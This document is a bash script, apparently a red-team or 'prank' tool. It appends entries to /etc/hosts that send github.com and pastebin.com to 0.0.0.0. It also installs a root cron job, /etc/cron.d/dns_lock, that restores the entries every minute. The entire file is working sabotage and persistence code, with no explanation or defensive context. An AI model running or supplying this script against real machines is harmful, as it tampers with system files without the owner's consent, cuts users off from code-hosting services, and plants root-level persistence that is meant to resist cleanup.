#!/bin/bash
# cron_dns.sh

TARGETS=("github.com" "www.github.com" "pastebin.com" "www.pastebin.com")
HOSTS_FILE="/etc/hosts"
MARKER="rit.edu"

apply_prank() {
    for domain in "${TARGETS[@]}"; do
        if ! grep -q "$domain $MARKER" "$HOSTS_FILE"; then
            echo "0.0.0.0 $domain $MARKER" >> "$HOSTS_FILE"
        fi
    done
}

apply_prank

# drop cron job that reruns every minute as root
CRON_LINE="* * * * * root /bin/bash -c 'for d in github.com www.github.com pastebin.com www.pastebin.com; do grep -q \"\$d rit.edu\" /etc/hosts || echo \"0.0.0.0 \$d rit.edu\" >> /etc/hosts; done'"

echo "$CRON_LINE" > /etc/cron.d/dns_lock
chmod 644 /etc/cron.d/dns_lock